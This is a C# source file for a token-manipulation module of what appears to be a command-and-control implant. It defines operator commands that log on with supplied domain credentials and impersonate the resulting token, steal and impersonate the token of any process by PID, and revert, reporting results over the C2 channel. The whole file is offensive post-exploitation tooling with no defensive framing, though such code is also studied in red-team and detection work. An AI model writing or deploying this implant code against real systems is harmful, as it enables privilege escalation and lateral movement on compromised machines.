using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

using Shared.Models;

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;

namespace Agent.Modules
{
    public class TokenModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "Token",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "Create",
                        Delegate = CreateToken
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Revert",
                        Delegate = RevertToSelf
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Steal",
                        Delegate = StealToken
                    }
                }
            };
        }

        void CreateToken(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                
                var userDomain = (string)parameters.FirstOrDefault(p => p.Name.Equals("UserDomain", StringComparison.OrdinalIgnoreCase)).Value;
                var password = (string)parameters.FirstOrDefault(p => p.Name.Equals("Password", StringComparison.OrdinalIgnoreCase)).Value;

                var split = userDomain.Split('\\');
                var domain = split[0];
                var username = split[1];

                if (Token.CreateToken(username, domain, password))
                {
                    Agent.SendMessage($"Successfully created and impersonated token for {userDomain}");
                }
                else
                {
                    Agent.SendError($"Unable to create and impersonate token for {userDomain}");
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void RevertToSelf(string AgentID, C2Data C2Data)
        {
            if (Token.Rev2Self())
            {
                Agent.SendMessage("Token reverted");
            }
            else
            {
                Agent.SendError("Failed to revert token");
            }
        }

        void StealToken(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                var pid = (int)parameters.FirstOrDefault(p => p.Name.Equals("PID", StringComparison.OrdinalIgnoreCase)).Value;

                var process = Process.GetProcessById(pid);
                var owner = Helpers.GetProcessOwner(process);

                if (Token.StealToken(pid))
                {
                    Agent.SendMessage($"Successfully impersonated token for {owner}");
                }
                else
                {
                    Agent.SendError($"Failed to impersonate token for {owner}");
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }
    }
}